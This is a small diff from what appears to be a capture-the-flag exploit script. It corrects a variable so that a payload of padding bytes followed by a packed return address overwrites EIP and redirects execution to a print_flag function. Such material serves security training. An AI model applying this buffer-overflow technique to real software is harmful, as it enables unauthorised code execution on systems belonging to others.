@@ -9,7 +9,7 @@ def pack(p):
 
 payload = ""
 payload += "\n\n"
-d += 'A'*64 + 'B'*12
+payload += 'A'*64 + 'B'*12
 payload += pack(0x08048514) # Let's overwrite EIP so that we jump into the print_flag function :)
 
 def main():
